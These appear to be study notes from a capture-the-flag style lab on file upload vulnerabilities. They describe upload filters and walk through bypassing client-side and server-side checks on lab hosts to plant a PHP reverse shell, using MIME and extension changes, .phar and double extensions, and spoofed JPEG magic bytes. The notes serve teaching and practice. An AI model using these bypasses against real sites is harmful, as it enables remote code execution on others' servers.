<p>File extensions are used (in theory) to identify the contents of a file. In practice they are very easy to change, so actually don't mean much; however, MS Windows still uses them to identify file types, although Unix based systems tend to rely on other methods, which we'll cover in a bit. Filters that check for extensions work in one of two ways. They either&nbsp;<i>blacklist</i>&nbsp;extensions (i.e. have a list of extensions which are&nbsp;<strong><u>not</u></strong>&nbsp;allowed) or they&nbsp;<i>whitelist</i>&nbsp;extensions (i.e. have a list of extensions which&nbsp;<strong><u>are</u></strong>&nbsp;allowed, and reject everything else).</p>
<p><i><u>File Type Filtering:</u></i></p>
<p>Similar to Extension validation, but more intensive, file type filtering looks, once again, to verify that the contents of a file are acceptable to upload. We'll be looking at two types of file type validation:</p>
<p><i>MIME validation:&nbsp;</i>MIME (<strong>M</strong>ultipurpose&nbsp;<strong>I</strong>nternet&nbsp;<strong>M</strong>ail&nbsp;<strong>E</strong>xtension) types are used as an identifier for files -- originally when transfered as attachments over email, but now also when files are being transferred over HTTP(S). The MIME type for a file upload is attached in the header of the request, and looks something like this:<br>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image194.png" alt="Afbeelding met tafel

Automatisch gegenereerde beschrijving"></figure>
<p><br><br>MIME types follow the format &lt;type&gt;/&lt;subtype&gt;. In the request above, you can see that the image "spaniel.jpg" was uploaded to the server. As a legitimate JPEG image, the MIME type for this upload was "image/jpeg". The MIME type for a file can be checked client-side and/or server-side; however, as MIME is based on the extension of the file, this is extremely easy to bypass.<br><br>&nbsp;</p>
<p><i>Magic Number validation<strong>:&nbsp;</strong></i>Magic numbers are the more accurate way of determining the contents of a file; although, they are by no means impossible to fake. The "magic number" of a file is a string of bytes at the very beginning of the file content which identify the content. For example, a PNG file would have these bytes at the very top of the file:&nbsp;89 50 4E 47 0D 0A 1A 0A.<br>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image196.png"></figure>
<p><br>Unlike Windows, Unix systems use magic numbers for identifying files; however, when dealing with file uploads, it is possible to check the magic number of the uploaded file to ensure that it is safe to accept. This is by no means a guaranteed solution, but it's more effective than checking the extension of a file.</p>
<p><i><u>File Length Filtering:</u></i></p>
<p>File length filters are used to prevent huge files from being uploaded to the server via an upload form (as this can potentially starve the server of resources). In most cases this will not cause us any issues when we upload shells; however, it's worth bearing in mind that if an upload form only expects a very small file to be uploaded, there may be a length filter in place to ensure that the file length requirement is adhered to. As an example, our fully fledged&nbsp;PHP&nbsp;reverse shell from the previous task is 5.4Kb big -- relatively tiny, but if the form expects a maximum of 2Kb then we would need to find an alternative shell to upload.</p>
<p><i><u>File Name Filtering:</u></i></p>
<p>As touched upon previously, files uploaded to a server should be unique. Usually this would mean adding a random aspect to the file name, however, an alternative strategy would be to check if a file with the same name already exists on the server, and give the user an error if so. Additionally, file names should be sanitised on upload to ensure that they don't contain any "bad characters", which could potentially cause problems on the file system when uploaded (e.g. null bytes or forward slashes on&nbsp;Linux, as well as control characters such as&nbsp;;&nbsp;and potentially unicode characters). What this means for us is that, on a well administered system, our uploaded files are unlikely to have the same name we gave them before uploading, so be aware that you may have to go hunting for your shell in the event that you manage to bypass the content filtering.</p>
<p><i><u>File Content Filtering:</u></i></p>
<p>More complicated filtering systems may scan the full contents of an uploaded file to ensure that it's not spoofing its extension, MIME type and Magic Number. This is a significantly more complex process than the majority of basic filtration systems employ, and thus will not be covered in this room.</p>
<hr>
<p>It's worth noting that none of these filters are perfect by themselves -- they will usually be used in conjunction with each other, providing a multi-layered filter, thus increasing the security of the upload significantly. Any of these filters can all be applied client-side, server-side, or both.</p>
<p>Similarly, different frameworks and languages come with their own inherent methods of filtering and validating uploaded files. As a result, it is possible for language specific exploits to appear; for example, until&nbsp;PHP&nbsp;major version five, it was possible to bypass an extension filter by appending a null byte, followed by a valid extension, to the malicious&nbsp;.php&nbsp;file. More recently it was also possible to inject&nbsp;PHP&nbsp;code into the exif data of an otherwise valid image file, then force the server to execute it. These are things that you are welcome to research further, should you be interested.</p>
<p>&nbsp;</p>
<h4>Bypassing client-side filtering</h4>
<p>We'll begin with the first (and weakest) line of defence: Client-Side Filtering.</p>
<p>As mentioned previously, client-side filtering tends to be extremely easy to bypass, as it occurs entirely on a machine that&nbsp;<i>you</i>&nbsp;control. When you have access to the code, it's very easy to alter it.</p>
<p>There are four easy ways to bypass your average client-side file upload filter:</p>
<p><i>Turn off Javascript in your browser&nbsp;</i>-- this will work provided the site doesn't require Javascript in order to provide basic functionality. If turning off Javascript completely will prevent the site from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.</p>
<p><i>Intercept and modify the incoming page.&nbsp;</i>Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run. The process for this will be covered below.</p>
<p><i>Intercept and modify the file upload</i>. Where the previous method works&nbsp;<i>before&nbsp;</i>the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter). Again, we will cover the process for using this method in the course of the task.</p>
<p><i>Send the file directly to the upload point.</i>&nbsp;Why use the webpage with the filter, when you can send the file directly using a tool like&nbsp;<code>curl</code>? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like this:&nbsp;<code>curl -X POST -F "submit:&lt;value&gt;" -F "&lt;file-parameter&gt;:@&lt;path-to-file&gt;" &lt;site&gt;</code>. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.</p>
<p>We will be covering methods two and three in depth below.</p>
<hr>
<p>Let's assume that, once again, we have found an upload page on a website:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image198.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>As always, we'll take a look at the source code. Here we see a basic Javascript function checking for the MIME type of uploaded files:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image200.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>In this instance we can see that the filter is using a&nbsp;<i>whitelist</i>&nbsp;to exclude any MIME type that isn't&nbsp;<code>image/jpeg</code>.</p>
<p>Our next step is to attempt a file upload -- as expected, if we choose a JPEG, the function accepts it. Anything else and the upload is rejected.</p>
<p>Having established this, let's start&nbsp;<a href="https://blog.tryhackme.com/setting-up-burp/">Burpsuite</a>&nbsp;and reload the page. We will see our own request to the site, but what we really want to see is the server's&nbsp;<i>response</i>, so right click on the intercepted data, scroll down to "Do Intercept", then select "Response to this request":</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image201.png"></figure>
<p>When we click the "Forward" button at the top of the window, we will then see the server's response to our request. Here we can delete, comment out, or otherwise break the Javascript function before it has a chance to load:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image203.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Having deleted the function, we once again click "Forward" until the site has finished loading, and are now free to upload any kind of file to the website:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image205.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>It's worth noting here that Burpsuite will not, by default, intercept any external Javascript files that the web page is loading. If you need to edit a script which is not inside the main page being loaded, you'll need to go to the "Options" tab at the top of the Burpsuite window, then under the "Intercept Client Requests" section, edit the condition of the first line to remove&nbsp;<code>^js$|</code>:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image207.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<hr>
<p>We've already bypassed this filter by intercepting and removing it prior to the page being loaded, but let's try doing it by uploading a file with a legitimate extension and MIME type, then intercepting and correcting the upload with Burpsuite.</p>
<p>Having reloaded the webpage to put the filter back in place, let's take the reverse shell that we used before and rename it to be called "shell.jpg". As the MIME type (based on the file extension) automatically checks out, the Client-Side filter lets our payload through without complaining:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image209.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Once again we'll activate our Burpsuite intercept, then click "Upload" and catch the request:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image211.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Observe that the MIME type of our&nbsp;PHP&nbsp;shell is currently&nbsp;<code>image/jpeg</code>. We'll change this to&nbsp;<code>text/x-php</code>, and the file extension from&nbsp;<code>.jpg</code>&nbsp;to&nbsp;<code>.php</code>, then forward the request to the server:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image212.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Now, when we navigate to&nbsp;<code>http://demo.uploadvulns.thm/uploads/shell.php</code>&nbsp;having set up a netcat listener, we receive a connection from the shell!</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image214.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<hr>
<p>We've covered in detail two ways to bypass a Client-Side file upload filter. Now it's time for you to give it a shot for yourself! Navigate to&nbsp;<code>java.uploadvulns.thm</code>&nbsp;and bypass the filter to get a reverse shell. Remember that not all client-side scripts are inline! As mentioned previously, Gobuster would be a very good place to start here -- the upload directory name will be changing with every new challenge.</p>
<p>&nbsp;</p>
<h4>Server side filtering</h4>
<p>&nbsp;</p>
<h5>File extensions:</h5>
<p>Time to turn things up another notch!</p>
<p>Client-side filters are easy to bypass -- you can see the code for them, even if it's been obfuscated and needs processed before you can read it; but what happens when you&nbsp;<i>can't</i>&nbsp;see or manipulate the code? Well, that's a server-side filter. In short, we have to perform a lot of testing to build up an idea of what is or is not allowed through the filter, then gradually put together a payload which conforms to the restrictions.</p>
<p>For the first part of this task we'll take a look at a website that's using a blacklist for file extensions as a server side filter. There are a variety of different ways that this could be coded, and the bypass we use is dependent on that. In the real world we wouldn't be able to see the code for this, but for this example, it will be included here:</p>
<p><code>&lt;?php</code><br><code>&nbsp;&nbsp;&nbsp; //Get the extension</code><br><code>&nbsp;&nbsp;&nbsp; $extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];</code><br><code>&nbsp;&nbsp;&nbsp; //Check the extension against the blacklist -- .php and .phtml</code><br><code>&nbsp;&nbsp;&nbsp; switch($extension){</code><br><code>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; case "php":</code><br><code>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; case "phtml":</code><br><code>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; case NULL:</code><br><code>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $uploadFail = True;</code><br><code>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;</code><br><code>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; default:</code><br><code>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $uploadFail = False;</code><br><code>&nbsp;&nbsp;&nbsp; }</code><br><code>?&gt;</code><br><br>&nbsp;</p>
<p>In this instance, the code is looking for the last period (<code>.</code>) in the file name and uses that to confirm the extension, so that is what we'll be trying to bypass here. Other ways the code could be working include: searching for the first period in the file name, or splitting the file name at each period and checking to see if any blacklisted extensions show up. We'll cover this latter case later on, but in the meantime, let's focus on the code we've got here.</p>
<p>We can see that the code is filtering out the&nbsp;<code>.php</code>&nbsp;and&nbsp;<code>.phtml</code>&nbsp;extensions, so if we want to upload a&nbsp;PHP&nbsp;script we're going to have to find another extension. The&nbsp;<a href="https://en.wikipedia.org/wiki/PHP">wikipedia page</a>&nbsp;for&nbsp;PHP&nbsp;gives us a few common extensions that we can try; however, there are actually a variety of other more rarely used extensions available that webservers may nonetheless still recognise. These include:&nbsp;<code>.php3</code>,&nbsp;<code>.php4</code>,&nbsp;<code>.php5</code>,&nbsp;<code>.php7</code>,&nbsp;<code>.phps</code>,&nbsp;<code>.php-s</code>,&nbsp;<code>.pht</code>&nbsp;and&nbsp;<code>.phar</code>. Many of these bypass the filter (which only blocks<code>.php</code>&nbsp;and&nbsp;<code>.phtml</code>), but it appears that the server is configured not to recognise them as&nbsp;PHP&nbsp;files, as in the below example:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image216.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>This is actually the default for Apache2 servers, at the time of writing; however, the sysadmin may have changed the default configuration (or the server may be out of date), so it's well worth trying.</p>
<p>Eventually we find that the&nbsp;<code>.phar</code>&nbsp;extension bypasses the filter -- and works -- thus giving us our shell:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image218.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>&nbsp;</p>
<hr>
<p>Let's have a look at another example, with a different filter. This time we'll do it completely black-box: i.e. without the source code.</p>
<p>Once again, we have our upload form:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image220.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Ok, we'll start by scoping this out with a completely legitimate upload.&nbsp;Let's try uploading the&nbsp;<code>spaniel.jpg</code>&nbsp;image from before:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image222.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Well, that tells us that JPEGS are accepted at least. Let's go for one that we can be pretty sure will be rejected (<code>shell.php</code>):</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image224.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Can't say that was unexpected.</p>
<p>From here we enumerate further, trying the techniques from above and just generally trying to get an idea of what the filter will accept or reject.</p>
<p>In this case we find that there are no shell extensions that both execute, and are not filtered, so it's back to the drawing board.</p>
<p>In the previous example we saw that the code was using the&nbsp;<code>pathinfo()</code>&nbsp;PHP&nbsp;function to get the last few characters after the&nbsp;<code>.</code>, but what happens if it filters the input slightly differently?</p>
<p>Let's try uploading a file called&nbsp;<code>shell.jpg.php</code>. We already know that JPEG files are accepted, so what if the filter is just checking to see if the&nbsp;<code>.jpg</code>&nbsp;file extension is somewhere within the input?</p>
<p>Pseudocode for this kind of filter may look something like this:</p>
<p><code>ACCEPT FILE FROM THE USER -- SAVE FILENAME IN VARIABLE userInput</code><br><code>IF STRING ".jpg" IS IN VARIABLE userInput:</code><br><code>&nbsp;&nbsp;&nbsp; SAVE THE FILE</code><br><code>ELSE:</code><br><code>&nbsp;&nbsp;&nbsp; RETURN ERROR MESSAGE</code><br>&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p>When we try to upload our file we get a success message. Navigating to the&nbsp;<code>/uploads</code>&nbsp;directory confirms that the payload was successfully uploaded:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image225.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Activating it, we receive our shell:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image227.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<hr>
<p>This is by no means an exhaustive list of upload vulnerabilities related to file extensions. As with everything in hacking, we are looking to exploit flaws in code that others have written; this code may very well be uniquely written for the task at hand. This is the really important point to take away from this task: there are a million different ways to implement the same feature when it comes to programming -- your exploitation must be tailored to the filter at hand. The key to bypassing any kind of server side filter is to enumerate and see what is allowed, as well as what is blocked; then try to craft a payload which can pass the criteria the filter is looking for.</p>
<hr>
<p>Now your turn. You know the drill by now -- figure out and bypass the filter to upload and activate a shell. Your flag is in&nbsp;<code>/var/www/</code>. The site you're accessing is&nbsp;<code>annex.uploadvulns.thm</code>.</p>
<p>Be aware that this task has also implemented a randomised naming scheme for the first time. For now you shouldn't have any trouble finding your shell, but be aware that directories will not always be indexable...</p>
<p>&nbsp;</p>
<h5>Magic numbers:</h5>
<p>We've already had a look at server-side extension filtering, but let's also take the opportunity to see how magic number checking could be implemented as a server-side filter.</p>
<p>As mentioned previously, magic numbers are used as a more accurate identifier of files. The magic number of a file is a string of hex digits, and is always the very first thing in a file. Knowing this, it's possible to use magic numbers to validate file uploads, simply by reading those first few bytes and comparing them against either a whitelist or a blacklist. Bear in mind that this technique can be very effective against a&nbsp;PHP&nbsp;based webserver; however, it can sometimes fail against other types of webserver (hint hint).</p>
<p>Let's take a look at an example. As per usual, we have an upload page:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image229.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>As expected, if we upload our standard shell.php file, we get an error; however, if we upload a JPEG, the website is fine with it. All running as per expected so far.</p>
<p>From the previous attempt at an upload, we know that JPEG files are accepted, so let's try adding the JPEG magic number to the top of our&nbsp;<code>shell.php</code>&nbsp;file. A quick look at the&nbsp;<a href="https://en.wikipedia.org/wiki/List_of_file_signatures">list of file signatures on Wikipedia</a>&nbsp;shows us that there are several possible magic numbers of JPEG files. It shouldn't matter which we use here, so let's just pick one (<code>FF D8 FF DB</code>). We could add the ASCII representation of these digits () directly to the top of the file but it's often easier to work directly with the hexadecimal representation, so let's cover that method.</p>
<p>Before we get started, let's use the&nbsp;Linux&nbsp;<code>file</code>&nbsp;command to check the file type of our shell:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image231.png"></figure>
<p>As expected, the command tells us that the filetype is&nbsp;PHP. Keep this in mind as we proceed with the explanation.</p>
<p>We can see that the magic number we've chosen is four bytes long, so let's open up the reverse shell script and add four random characters on the first line. These characters do not matter, so for this example we'll just use four "A"</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image233.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Save the file and exit. Next we're going to reopen the file in&nbsp;<code>hexeditor</code>&nbsp;(which comes by default on Kali), or any other tool which allows you to see and edit the shell as hex.&nbsp;In hexeditor the file looks like this:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image235.png" alt="Afbeelding met tekst, elektronica, toetsenbord

Automatisch gegenereerde beschrijving"></figure>
<p>Note the four bytes in the red box: they are all&nbsp;<code>41</code>, which is the hex code for a capital "A" -- exactly what we added at the top of the file previously.</p>
<p>Change this to the magic number we found earlier for JPEG files:&nbsp;<code>FF D8 FF DB</code></p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image237.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Now if we save and exit the file (Ctrl + x), we can use&nbsp;<code>file</code>&nbsp;once again, and see that we have successfully spoofed the filetype of our shell:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image239.png"></figure>
<p>Perfect. Now let's try uploading the modified shell and see if it bypasses the filter!</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image241.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>There we have it -- we bypassed the server-side magic number filter and received a reverse shell.</p>
<p>Head to&nbsp;<code>magic.uploadvulns.thm</code>&nbsp;-- it's time for the last mini-challenge.</p>
<hr>
<p>This will be the final example website you have to hack before the challenge in task eleven; as such, we are once again stepping up the level of basic security. The website in the last task implemented an altered naming scheme, prepending the date and time of upload to the file name. This task will not do so to keep it relatively easy; however, directory indexing has been turned off, so you will not be able to navigate to the directory containing the uploads. Instead you will need to access the shell directly using its URI.</p>
<p>&nbsp;</p>
